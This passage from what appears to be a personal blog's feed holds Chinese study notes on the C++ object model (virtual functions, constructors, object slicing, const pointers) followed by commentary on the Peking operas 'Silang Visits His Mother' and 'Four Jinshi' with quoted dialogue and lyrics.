指针”这一点。一般规则是，经由指向“第二或后继base class 的指针”来调用derived class virtual function。调用操作连带的“必要的this指针调整”操作，必须在执行期完成。</p><p>虚拟继承下的 Virtual Functions</p><h3 id="函数的效能"><a href="#函数的效能" class="headerlink" title="函数的效能"></a>函数的效能</h3><p>nonmemeber、static member或nonstatic member函数都被转换为完全相同形式，所以三者效率完全相同。</p><h3 id="指向Member-Function的指针"><a href="#指向Member-Function的指针" class="headerlink" title="指向Member Function的指针"></a>指向Member Function的指针</h3><p>取一个nonstatic data member的地址，得到的结果是该member在class 布局中的bytes位置，所以它需要绑定于某个class object的地址上，才能够被存取。</p><p>取一个nonstatic member function的地址，如果该函数是nonvirtual，则得到的是内存的真正地址，然后这个值也是不完全的，也需要绑定于某个class object的地址上，才能够调用函数。</p><p>支持指向Virtual Member Function之指针</p><p>对于一个virtual function，其地址在编译时期是未知的，所能知道的仅是virtual function在其相关之virtual table的索引值，也就是说，对于一个virtual member function 取其地址，所能获得的只是一个索引值。</p><h3 id="Inline-Funcitons"><a href="#Inline-Funcitons" class="headerlink" title="Inline Funcitons"></a>Inline Funcitons</h3><ul><li><p>形参:传入参数，直接替换 传入常量，连替换都省了，直接变成常量 传入函数运行结果，则需要导入临时变量</p></li><li><p>局部变量:局部变量会被mangling，以便inline函数被替换后名字唯一 也就是说一次性调用N次，就会出现N个临时变量……程序的体积会暴增</p></li></ul><h2 id="第五章-构造、解构、拷贝-语意学"><a href="#第五章-构造、解构、拷贝-语意学" class="headerlink" title="第五章 构造、解构、拷贝 语意学"></a>第五章 构造、解构、拷贝 语意学</h2><h4 id="继承体系下的对象构造"><a href="#继承体系下的对象构造" class="headerlink" title="继承体系下的对象构造"></a>继承体系下的对象构造</h4><p>constructor的调用伴随了哪些步骤：</p><ol><li>初始化列表（member initialization list)的data members初始化操作会被放进constructor的函数本身，并以membs的声明顺序为顺序。</li><li>如果有一个member并没有在初始化列表中，但它在一个default constructor，那么该default constructor 必须被调用（手动）。</li><li>在那之前，如果class object有virtual table pointer(s)，它（们）必须被设定初始值，指定适当的virtual table(s)。</li><li>在那之前，所有上一层的base class constructors 必须被调用，以base class 的声明顺序为顺序（与初始化列表的顺序没有关联）。如果base class 被列于初始化列表中，那么任何明确指定参数都应该传递过去。如果base class 没有列于初始化列表，那么调用default constructor。如果base class 是多重继承下的第二或后面的base class ，那么this指针必须有所调整。</li><li>在那之前，所有 virtual base class constructors 必须被调用，从左到右，从最深到最浅。</li></ol><p>如果class 被列于初始化列表中，那么如果有任何明确指定的参数，都应该传递过去，若没有列于初始化列表中，则调用default constructor。</p><p>此外，class中的每一个virtual base class subobject的偏移量必须在执行期可存取。</p><p>如果class object 是最底层的class，某constructors可能被调用；某些用以支持这个行为的机制必须被放进来。</p><h4 id="对象复制语意学"><a href="#对象复制语意学" class="headerlink" title="对象复制语意学"></a>对象复制语意学</h4><p>当设计一个class，并以一个class object 指定另一个class object时，有三种选择：</p><ol><li>什么都不做，实施默认行为。</li><li>提供一个explicit copy assignment operator。</li><li><p>明确拒绝一个class object指定给另一个class object。一个class对于默认的copy assignment operator，在以下情况下不会表现出 bitwise copy语意：</p></li><li><p>当一个class的base class 有一个copy assignment operator时，</p></li><li>当一个class 的member object，而其class 有一个copy assignment operator时，</li><li>当一个class 声明了任何virtual functions时，</li><li>当class继承一个virtual base class 时。</li></ol><h4 id="vptr语意学"><a href="#vptr语意学" class="headerlink" title="vptr语意学"></a>vptr语意学</h4><p>vptr在constructor何时被初始化？在base class constructors调用操作之后，但是在程序员供应的码或是初始化列表中所列的members初始化操作之前。</p><h4 id="解构语意学"><a href="#解构语意学" class="headerlink" title="解构语意学"></a>解构语意学</h4><p>destructor被扩展的方式：</p><ol><li>destructor的函数本身首先被执行。</li><li>如果class拥有member class objects，而后拥有destructor，那么它们会以声明顺序的相反顺序被调用。</li><li>如果object内带一个vptr，则现在被重新设定，指向适当的base class virtual table。</li><li>如果有任何直接的（上一层）nonvirtual base classes 拥有destructor ，它们会以声明顺序相反顺序调用。</li><li>如果有任何virtual base classes 拥有destructor，而当前讨论的这个class 是最尾端的class，那么它们会以其原来顺序相反顺序被调用。</li></ol><h2 id="第六章-执行期语意学"><a href="#第六章-执行期语意学" class="headerlink" title="第六章 执行期语意学"></a>第六章 执行期语意学</h2><h2 id="第七章-……"><a href="#第七章-……" class="headerlink" title="第七章 ……"></a>第七章 ……</h2><h2 id="补充：类型向上转型和多态的混淆"><a href="#补充：类型向上转型和多态的混淆" class="headerlink" title="补充：类型向上转型和多态的混淆"></a>补充：类型向上转型和多态的混淆</h2><p>构造这样的一个继承体系：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>: <span class="keyword">virtual</span> ~Base() &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>: <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Derived"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>子类Derived类重写了基类Base中的show方法。 编写下面的测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Base b; Derived d;</span><br><span class="line">b.show(); d.show();</span><br></pre></td></tr></table></figure><p>结果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Base</span><br><span class="line">Derived</span><br></pre></td></tr></table></figure><p>Base的对象调用了Base的方法，而Derived的对象调用了Derived的方法。因为直接用对象来调用成员函数时不会开启多态机制，故编译器直接根据b和d各自的类型就可以确定调用哪个show函数了，也就是在这两句调用中，编译器为它们每一个都确定了一个唯一的入口地址。这实际上类似于一个重载多态，虽然这两个show函数拥有不同的作用域。 那这样呢： Base b; Derived d; b.show(); b = d; b.show(); 现在，一个Base的对象被赋值为子类Derived的对象。</p><p>那这样呢：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Base b; Derived d;</span><br><span class="line">b.show(); b = d; b.show();</span><br></pre></td></tr></table></figure><p>现在，一个Base的对象被赋值为子类Derived的对象。</p><p>结果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Base</span><br><span class="line">Base</span><br></pre></td></tr></table></figure><p>对于熟悉Java的人而言，这不可理解。但实际上，C++不是Java，它更像C。“b = d”的意思，并不是Java中的“让一个指向Base类的引用指向它的子类对象”，而是“把Base类的子类对象中的Base子对象分割出来，赋值给b”。所以，只要b的类型始终是Base，那么b.show()调用的永远都是Base类中的show函数；换句话说，编译器总是把Base中的那个show函数的入口地址作为b.show()的入口地址。这根本就没用上多态。</p><p>单继承下的重写多态</p><p>那我们再这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Base b; Derived d;</span><br><span class="line">Base *p = &amp;b;</span><br><span class="line">p-&gt;show();</span><br><span class="line">p = &amp;d;</span><br><span class="line">p-&gt;show();</span><br></pre></td></tr></table></figure><p>这时，结果就对了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Base</span><br><span class="line">Derived</span><br></pre></td></tr></table></figure><p>p是一个指向基类对象的指针，第一次它指向一个Base对象，p-&gt;show()调用了Base类的show函数；而第二次它指向了一个Derived对象，p-&gt;show()调用了Derived类的show函数。</p><p>总结：也就是说，只有是指针或者引用才是真正的多态，将子对象赋给父类对象其实类型向上转型.</p><h2 id="补补充"><a href="#补补充" class="headerlink" title="补补充"></a>补补充</h2><h3 id="1-const和指针的修饰问题"><a href="#1-const和指针的修饰问题" class="headerlink" title="1.  const和指针的修饰问题"></a>1.  const和指针的修饰问题</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * a;   <span class="comment">//一个指针a指向const char</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">const</span> *a;      <span class="comment">//这两个是a指向的内容是常量，不能改变</span></span><br><span class="line"><span class="keyword">char</span> * <span class="keyword">const</span> a;     <span class="comment">//首先a 是指针然后还是const</span></span><br><span class="line"><span class="keyword">const</span> (<span class="keyword">char</span>*) a;     <span class="comment">//这两个是a指针本身是常量，指针本身不能改变</span></span><br></pre></td></tr></table></figure><p>其实，可以看出如果const修饰的char(也就是类型本身或者是 <em>variable对指针的解引用）就是指针指向的内容是常量，反之就是修饰指针本身的。那我们可以总结一个识别方法就是：看const 两边（当然有的只有一边）的类型是类型（指针指向的内容）就是类型变量本身是常量（如const char </em> a和char const <em>a 的const两边是char，</em>a）。</p><p>当然两者都是常量就是：const char <em> const a;第一个const是类型常量，第二个才是指针常量。同样给出 const char &amp;a ;const char </em>a;在传递参数时使用。</p><h3 id="2-数组和指针的组合问题"><a href="#2-数组和指针的组合问题" class="headerlink" title="2. 数组和指针的组合问题"></a>2. 数组和指针的组合问题</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * a[M];  </span><br><span class="line"></span><br><span class="line"><span class="comment">//这是指针数组，就是每一个元素是指针的数组，每个元素都要初始化。a[M]一看就是数组，这个数组每一个元素是char *，所以可以将char *扩展为一维数组然后a[M]就是二维数组了。其实就是M个指针。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> (*a)[N];  </span><br><span class="line"></span><br><span class="line"><span class="comment">//这是一个指针，这个指针指向N个char元素，即指向数组的指针，其实就是一个指针。把（*a)看着一个变量，这个变量是指向N个元素的指针，所以只是一个一维数组。把char (*a)[N]看成是char b[N]就可以了。</span></span><br></pre></td></tr></table></figure><h3 id="3-C-变量的初始化"><a href="#3-C-变量的初始化" class="headerlink" title="3. C++变量的初始化"></a>3. C++变量的初始化</h3><p>对于内置类型局部变量不进行初始化，但是分配地址，全局变量会进行默认初始化。对于类类型局部变量（没有显式初始化）会进行默认初始化（有默认构造函数，否则报错），但其内部的内置数据成员不会进行初始化（如果在默认构造函数没有进行初始化）。数组也是同样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考自&lt;a href=&quot;https://www.cnblogs.com/qiaozhoulin/p/5227690.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这个大佬&lt;/a&gt;, 拜读后手抄了一遍。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;第一章-关
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="C++" scheme="https://github.com/Cracke-S-J/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>四郎探母(看url:yangsilang-visit-his-mother)</title>
    <link href="https://github.com/Cracke-S-J/2019/06/06/yangsilang-visit-his-mother/"/>
    <id>https://github.com/Cracke-S-J/2019/06/06/yangsilang-visit-his-mother/</id>
    <published>2019-06-06T04:48:42.000Z</published>
    <updated>2020-01-03T09:39:06.433Z</updated>
    
    <content type="html"><![CDATA[<p>四郎探母可以说特别经典了，本人听过很多各式各样的版本，最震撼的还是杜月笙生日那次，哈哈。</p><p>其中 gdg 的见母给我听笑了，奇奇怪怪，是我出戏了。</p><hr><p>四郎探母是杨家将的故事，剧中淡化了战争，突出了忠孝仁义，人情伦理。</p><p>杨家共生了六个儿子，两个女儿，后来又收了一个义子，分别排行为大郎、二郎、三郎、四郎、五郎、六郎、七郎、八姐、九妹（京剧中不是这样，毕竟还有一出戏叫八郎探母）。他们个个是英雄好汉，每个人都能带兵打仗，独当一面。</p><p>杨四郎长得一表人材，武艺高强，英勇善战，在几个兄弟中间，最得父母的喜欢。他们寄希望于四郎，日后统率杨家将的非他莫属，然而谁能想到，金沙滩一场恶战，却改写了他的人生命运。</p><p>雁门关北面的金沙滩，北国的契丹王在那儿设下重兵。杨家将全部出征，拼死厮杀。但杨家将在这场大战中损失惨重，伤失元气。首先是大郎和二郎身亡，一个被乱箭射死，一个被大刀劈死；而三郎死得更加悲壮，他在追杀敌军时陷入淤泥之中，被对方的战马踩死；过后清点人数时，又发现四郎失踪，有的说是被北国俘虏了，有的说失散了。由于杨家大将死伤过半，朝廷虽给予封赏，但毕竟元气难以恢复；而且有人说三道四，伤透了杨家人心。在这种情况下，五郎为了超世脱俗，便出家当了和尚（一说是重伤被五台山方丈救下）。</p><p>杨四郎的确是和杨家将失散了，他是在向敌人冲杀时，被对方裹挟走的。人多，混乱，在情急中迷失了方向。可当他发现走错方向时晚了，因为对方的将领早已看到他勇猛厮杀，非普通军士，就让人把他给绑了，押送回营。再说契丹王的损失也十分惨重，老王在大战中身亡。众将佐觉得不可一日无王，经过合计，就推拥皇后萧绰执掌朝政，这就是历史上有名的萧太后。人们押着杨四郎来到萧太后跟前，备说详情，断言他肯定是杨家大将。既已被俘，杨四郎已经作好了必死的准备。不过他不甘心，他要时刻准备返回宋朝，和各位兄弟一起为国尽忠。于是，当萧太后问他叫什么时，他说了一个假名：木易。呵，不是杨家人，萧太后放心了。呵。</p><p>萧太后所生一女，名为铁镜公主，虽已年过十八，尚未许配人家。当然会有一些大臣来为公主说媒拉线，均因萧太后看不上那些想做她女婿的人，直到如今也没有把婚事定下来。萧太后见这个穆义长得相貌堂堂，又让他试了试武功，甚为满意。便让大臣作媒，把铁镜公主嫁给了他。</p><p>四郎家有娇妻孟氏，两人十分恩爱。他当然不愿娶北番公主，因为他并不打算在北方呆一辈子，一有机会他会跑回宋朝的。但经不住别人的威胁，他也只好屈从了。就这样，杨家人对他生死不知；而他也是时刻挂念着母亲和众兄弟姐妹。虽说萧太后和公主待他很好，但一片思乡之情无时无刻不在煎熬着他。</p><p>一晃十五年过去了，杨延辉由一个青年变成了已届而立的中年人。此时我猜杨四郎心境已与当年不同了。在辽做了驸马，皇亲国戚有家有口的，为什么还要回宋给皇上卖力呢。当然这是个人理解，也可以说如果我是杨四郎我是不会回去的哈哈哈哈。</p><p>萧天佐摆下天门大阵，六郎延昭挂帅，老母佘太君亲押粮草来到北番，四郎很想去见母亲一面。</p><ul><li>第一折坐宫，可见四郎和公主相敬如宾十分恩爱，公主也是性情中人。</li><li>见母，佘太君听闻四郎经历后，并没有国别民族的偏见，而是问公主贤不贤惠，可不可爱。</li><li>四郎已经回到宋营，但为还令箭仍赶在天亮之前回到银安，可见与公主恩爱有佳，也可见他并不是很想为宋朝继续卖命了。</li><li>见妻现在逐渐不演了，咱也不知道为什么…回营，六郎、佘太君、孟氏、八姐九妹好一通哭，没拦住，天地为大忠孝当先，日后见母梦里再见。</li><li>四郎得救后，萧太后命其把守北天门，并把金鈚箭给了他，虽说是不准他回营探母，为什么不理解成，是对杨延辉的信任，允许他想妈了就回去看看呢？</li></ul><hr><p><strong>杨六郎告御状</strong></p><p>这段京剧一般不演了，只听过李军老师的徽剧唱段，情感很很很到位，真不愧是我准叔，很有准（真）。</p><p>杨六郎在八贤王的帮助下，把潘洪（潘仁美）搞死了。</p><blockquote><p>我杨家下幽州，八骑马八杆枪，好似八条蛟龙弄海潮，到如今只落得单骑延昭。</p></blockquote><p><strong>八贤王</strong></p><p>赵德芳（八贤王、八王），宋太祖赵匡胤第四子，宋太宗赵光义之侄，宋真宗赵恒的堂兄，北宋宗室。在戏曲演义中，赵德芳也被虚构为手持金锏，上打昏君，下打谗臣的正气凛然的“八贤王”形象，是正义化身，出现于杨家将、包青天、三侠五义等故事中。</p><p>赵匡胤去世之后，本来皇位的人选就是赵德芳，但是此时的赵德芳仅仅只有3岁，根本无法担任皇帝，于是赵光义申请做了摄政王，但是就在第二天上朝的时候，不知道是不是赵光义派人安排好了，满朝的文武百官纷纷要求摄政王的赵光义登基做皇帝，对于小太子赵德芳，大家认为等到赵德芳长大之后，赵光义再禅让，这样才能让天下安定，文武百官才能够信服，最终赵光义如愿以偿的做了大宋朝的第二任皇帝。</p><p>赵光义做了皇帝之后，首先的第一件事就是安顿赵匡胤的妻子和儿子，但是这样登基的赵光义在很多的礼教上是说不过去的，在宋皇后知道赵光义做了皇帝的消息之后，于是宋皇后公然登上金銮宝殿，对着赵光义破口大骂，毕竟是赵光义害死了自己的亲哥哥，而且还公开抢夺自己侄子的皇位，这样的举动真的是无德无义之人，面对皇后的唾骂，赵光义在无奈之下便开始对他们进行封赏，封宋皇后为皇太后。</p><p>不过，最让人为难的还是小太子赵德芳，最大的封赏就是把皇位还给赵德芳，但是赵德芳年纪太小，无法做皇帝，再说了赵光义也舍不得自己的皇位，于是赵光义便封了赵德芳为保国王、护国王、上殿不参王、下殿不辞王、殿前王、殿左王、殿右王、殿后王（听着这么像郭老编的，听书听个乐），八贤王，世袭罔替的八大贤王，并赐瓦面金锏，上打昏君，下打谗臣。</p><p>所以为什么八王上金殿他那么横，因为江山是人家家里的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;四郎探母可以说特别经典了，本人听过很多各式各样的版本，最震撼的还是杜月笙生日那次，哈哈。&lt;/p&gt;
&lt;p&gt;其中 gdg 的见母给我听笑了，奇奇怪怪，是我出戏了。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;四郎探母是杨家将的故事，剧中淡化了战争，突出了忠孝仁义，人情伦理。&lt;/p&gt;
&lt;p&gt;杨家共生
      
    
    </summary>
    
    
      <category term="听戏" scheme="https://github.com/Cracke-S-J/categories/opera/"/>
    
    
      <category term="京剧" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%AC%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>四进士(又名宋士杰)</title>
    <link href="https://github.com/Cracke-S-J/2019/05/31/songshijie/"/>
    <id>https://github.com/Cracke-S-J/2019/05/31/songshijie/</id>
    <published>2019-05-31T10:15:02.000Z</published>
    <updated>2019-06-24T09:52:19.754Z</updated>
    
    <content type="html"><![CDATA[<p>周信芳先生、马连良先生均以《四进士》享名，麒派的宋士杰苍劲老辣，马派潇洒油滑。</p><p>我本人完整听过麒麟童周信芳先生的电影，张学津先生、陈少云老师那一版，还有别的版本的一些片段。</p><hr><p>宋士杰是一个讼师。他们的职业是包打官司，即包揽词讼。凡有衙门处即有讼师。只要你给他钱，他可以把你的官司包下来，把你的对手搞得倾家荡产，一败涂地。生活里，他们也是很刁钻促狭的。 讼师住的地方。做小买卖的都不愿停留。邻居家的孩子都不敢和他们家的孩子打架。然而《四进士》却写了一个比较特别的好讼师。</p><p>宋士杰的好处在于：一是办事傲上。二是好管闲事。办事傲上是因为他有才，好管闲事是因为他心善。</p><p>写他的爱管闲事，从他怕管闲事写起。</p><hr><p>明朝嘉靖年间，新科进士毛朋、田伦、顾读（顾读一出场就是个白脸，一看就不是什么好东西）、刘题四人出京为官，当时严嵩专权，同仇敌忾。相约饮酒中，相互勉励，赴任后不违法渎职，以报海瑞举荐之功德。</p><p>当时河南上蔡县姚廷春的妻子田氏图谋财产，毒死丈夫的弟弟姚廷美，又串通弟媳杨素贞之兄杨青，又把杨素贞转卖给布商杨春为妻。杨春听素贞哭诉，可怜她的遭遇，撕毁身契，代她告状。</p><p>原来是四本连台本戏，现在前面的一般不演了，四进士简化成一台本后直接从柳林告状开始。</p><p>杨春可怜杨素贞的遭遇，要代她去越衙告状，遇到八府巡按毛朋，毛朋是个好人，于是代写状纸。</p><p>杨春杨素贞在路上被一群小混混算计，走散了，杨素贞遇到了宋士杰。</p><p>宋士杰的出场是很平淡的。几记小锣，他就走出来了。四句诗罢，自报家门：</p><blockquote><p>老汉宋士杰。在前任道台衙门，当过一名刑房书吏。只因办事傲上。 才将我的刑房革退。在西门以外，开了一所小小店房。不过是避嫌而已……”</p></blockquote><p>避嫌。避什么嫌呢?避官场之嫌。 开店是一种姿态，表示引退闲居，从此不再往衙门里插手，免遭是非物议。 他显然也不甘寂寞。 偶尔给吃衙门饭的人一点指点。杯酒之间，三言两语。平常则是韬晦深藏，很少活动的了。以至顾读听说宋士杰这名字。吃惊道：”宋士杰!这老儿还未曾死么？”</p><p>他卷进一场复杂的纠纷。完全是无心的，偶然的。</p><p>宋士杰回家喊老婆出来出手从小混混手中救了杨素贞。</p><blockquote><p>救人一命少活十年呐。</p></blockquote><p>救下杨素贞，得知她是来越衙告状，宋士杰看了毛朋写的状纸：（我词记不准，也可能串版本什么的）</p><blockquote><p>牛吃房上草，风吹千斤石。一字入公门，不赖不成词。</p></blockquote><blockquote><p>此人不得第便罢，得了第，少不了八台之位。</p></blockquote><p>宋士杰收杨素贞为干女儿，替杨素贞告状。在路上，遇到丁旦请宋伯伯喝酒，顺便请教一桩疑案，错过了顾读升堂，便携女击鼓鸣冤。头公堂：</p><blockquote><p>顾读 （白） 宋士杰，你还不曾死啊？<br>宋士杰 （白） 哈哈！阎王不要命，小鬼不来缠，我是怎样得死啊！<br>顾读 （白） 你为何包揽词讼？<br>宋士杰 （白） 怎见得小人包揽词讼？<br>顾读 （白） 杨素贞越衙告状，住在你的家中，分明你挑唆而来，岂不是包揽词讼？<br>宋士杰 （白） 小人有下情回禀。<br>顾读 （白） 讲！<br>宋士杰 （白） 嗻！小人宋士杰，在前任道台衙门当过一名刑房书吏。只因我办事傲上，才将我的刑房革掉。在西门以外，开了一所小小店房，不过是避闲而已。曾记得那年去往河南上蔡县办差，住在杨素贞她你的家中。杨素贞那时间才长这么大，拜在我的名下，以为义女。数载以来，书不来，信不去，杨素贞她父已死。她长大成人，许配姚廷梅为妻。她的亲夫被人害死，来到信阳州，越衙告状。常言道，是亲者不能不顾，不是亲者不能相顾。她是我的干女儿，我是她的干父，干女儿不住在干父家中，难道说，教她住在庵堂寺院！<br>顾读 （白） 嘿！你好一张利口！<br>宋士杰 （白） 句句实言。<br>顾读 （白） 杨素贞讨保！<br>宋士杰 （白） 小人愿保。<br>顾读 （白） 啊！你为何保她？<br>宋士杰 （白） 干父不保干女儿，他们哪一个敢保？<br>顾读 （白） 我原要你保。<br>宋士杰 （白） 我保保何妨！</p></blockquote><p>一件没影子的事，宋士杰说得有鼻子有眼，活灵活现，点水不漏，无懈可击。这段辩词，层次清楚，语调铿锵，掷地作金石声!。”这长这大”，真亏他想得出来。什么叫讼师?这就叫讼师：数白道黑，将无作有。</p><p>田氏得知有人告她，让弟弟田伦给顾读写一封求情信，三百两白银压书信，田伦很犹豫但迫于母亲的压力还是写了。两个送信的公差住在宋士杰的店中，宋士杰见他们口角带字。</p><blockquote><p>公差甲 （白） 伙计，你看田、顾、刘三位大人，谁忠谁奸？<br>公差乙 （白） 伙计，管他谁忠谁奸，我们喝酒罢！这个年头，就是，酒酒酒，终日有，有钱的在天堂，无钱的下地狱。</p></blockquote><p>分析出了缘由，盗取书信，抄在衣襟上。所以田伦是把谱子也写上了吗…</p><blockquote><p>（西皮原板） 拜上了信阳州顾大人。<br>双塔寺前分别后，<br>倒有几载未相逢。<br>姚家庄有个杨氏女，<br>（西皮流水板） 她本是姚家不贤人。<br>药酒害死亲夫主，<br>反赖我姐丈姚廷椿。<br>三百两银子押书信，<br>还望年兄念弟情。<br>上风官司归故里，<br>登门叩谢顾年兄。</p></blockquote><p>二公堂，杨素贞被迫画押，宋士杰挨了四十个板子，宋士杰决定向毛朋告状，一状告倒三个官。</p><blockquote><p>顾读 （白） 这个……宋士杰，听你之言，莫非你受了贿了？<br>宋士杰 （白） 受贿？<br>顾读 （白） 受贿。<br>宋士杰 （白） 受贿。受贿不多……<br>顾读 （白） 多少？<br>宋士杰 （白） 三百两！<br>顾读 （白） 啊！<br>来，扯下去打！<br>宋士杰 （白） 且慢！你打我不得。<br>顾读 （白） 打了你，自然有你的过犯！<br>宋士杰 （白） 打我什么过犯？<br>顾读 （白） 我打你这个……<br>宋士杰 （白） 大人？<br>顾读 （白） 这……<br>宋士杰 （白） 大人？<br>顾读 （白） 哎，我打你一个欺官傲上！<br>宋士杰 （白） 嘿嘿！今天不挨你几个板子，你也不好意思退堂。来来来，打呀！<br>宋士杰 （白） 谢大人的责！<br>顾读 （白） 宋士杰，我打得你可公？<br>宋士杰 （白） 不公。<br>顾读 （白） 打得你可是？<br>宋士杰 （白） 不是。<br>顾读 （白） 不公也要公，不是也要是。从今以后，你要少来见我！<br>宋士杰 （白） 见见何妨？<br>顾读 （白） 再若见我，定要你的老命！<br>宋士杰 （白） 不定是谁要谁的命！<br>顾读 （白） 下去！<br>宋士杰 （白） 走。<br>顾读 （白） 轰了下去！<br>宋士杰 （白） 走哇！<br>（西皮散板） 公堂打我四十板，<br>一状要告他三个官！</p></blockquote><blockquote><p>可恨信阳道，贪赃又放刁。打我四十板，哎！恶气何日消！</p></blockquote><p>宋士杰写好状纸要找毛朋告状，巧遇到杨春，便让杨春去把状纸递上了。此处有成心让杨春去挨板子，可以这个遭老头子也留有心眼。</p><blockquote><p>田伦密札求情，官吏过简；顾读贪赃卖法，匿案准情；刘题好酒贪杯，不理民词。</p></blockquote><p>兄弟四人见面，三公堂</p><blockquote><p>不要这样的虎威，这是按院的行埠，不是你道台衙门了。</p></blockquote><p>宋士杰说了缘由</p><blockquote><p>毛朋 （白） 二位年兄，宋士杰和衣襟，就是你二人的对证了！<br>顾读 （白） 年兄，你不应当与我那封书信！<br>田伦 （白） 你不该收我那三百两银子！<br>顾读 （白） 唉！<br>田伦 （白） 我也是母命难违；有道是：<br> （念） 父母恩情重……<br>毛朋 （念） 朝廷法度严！<br>顾读 （念） 不听恩师语……<br>毛朋 （念） 王法大如天！<br> （白） 二位年兄，你我进京赴试，得中进士，只因不拜严嵩为师，可恨奸贼专权，不放我等为官。多蒙海瑞老师，苦苦保奏，才放我等帘外为官。我们出京之时，在双塔寺盟下誓愿，不许贪赃卖法，官吏过简，若有此事，棺木一口，仰面还乡。小弟不才，实授八府巡按，查得上三府，官是清官，民是顺民。查得下五府，官是赃官，民是刁民。查来查去，这赃官二字却应在我们年兄弟的身上，叫小弟哪里去寻，哪里去访！<br>田伦、顾读 （白） 求大人谅情一二！<br>毛朋 （白） 说什么谅情一二！圣上恩赐上方宝剑，一同拜过，小弟得罪了。</p></blockquote><p>宋士杰再上</p><blockquote><p>宋士杰 （白） 与大人叩头。<br>毛朋 （白） 宋士杰，有道是“民不告官”，你一状告倒两员封疆大吏，一个百里县令，岂能无罪！<br>宋士杰 （白） 望大人格外施恩！<br>毛朋 （白） 念你年迈，发往边外充军，当堂上刑。下去！<br>宋士杰 （白） 谢大人。</p></blockquote><p>绝唱：</p><p>（西皮散板）</p><blockquote><p>公堂之上上了刑，<br>好似鳌鱼把钩吞。<br>悲切切出了都察院，<br>只见杨春与素贞。<br>你家在河南上蔡县，<br>你住南京水西门。<br>我三人从来不相认，<br>宋士杰与你们是哪门子亲！<br>我为你挨了四十板，<br>我为你披枷带锁边外去充军。<br>可怜我年迈人离乡井，<br>杨春、杨素贞啊！<br>谁是我披麻带孝人！<br>干父不要两泪淋，<br>孩儿言来听分明：<br>倘若干父下世早，<br>儿是披麻带孝人。<br>唉，妄想啊妄想！</p></blockquote><p>发现毛朋是代写状纸的人后，宋士杰又上堂耍了一顿嘴皮子，最后完美结局。</p><blockquote><p>（西皮散板） 你认得清来见得明，<br>我充军的事儿就去不成哪！<br>二次进了都察院，<br>尊声青天老大人：<br>百姓告官是有罪，<br>无有状子告不成！<br>毛朋 （西皮散板） 本院奉命出帝京，<br>明查暗访为黎民。<br>为不平我把状子写，<br>王法条条不徇情。<br>宋士杰 （西皮散板） 大人奉命出帝京，<br>明查暗访为黎民。<br>有日大人回朝转，<br>你在凌烟阁上标美名，你是个大忠臣。<br>毛朋 （西皮散板） 柳林写状为百姓，<br>宋士杰 （西皮散板） 宋士杰打的是抱不平。<br>毛朋 （西皮散板） 黎民告官当问斩，<br>宋士杰 （白） 大人！<br>（西皮散板） 你在那柳林写状，犯法你是头一名！<br>毛朋 （白） 哎呀！<br>（西皮散板） 宋士杰说话真凶狠，<br>问得本院似哑人！<br>下得位来忙松捆，<br>你是我说不倒的老先生！</p></blockquote><p>有的版本没有下面这一段，不知道有没有后，但最后杨春都是他的义子了。</p><blockquote><p>（白） 宋士杰，你可有后？<br>宋士杰 （白） 小人乏嗣无后！<br>毛朋 （白） 也罢！将杨春拜在你的名下以为义子，如何？<br>宋士杰 （白） 不敢。<br>毛朋 （白） 杨春，拜见你干父。<br>杨春 （白） 拜见干父。<br>宋士杰 （白） 少礼！<br>毛朋 （白） 同到姚廷梅坟前一祭，以明善恶。<br>宋士杰 （白） 大人天恩！</p></blockquote>]]></content>
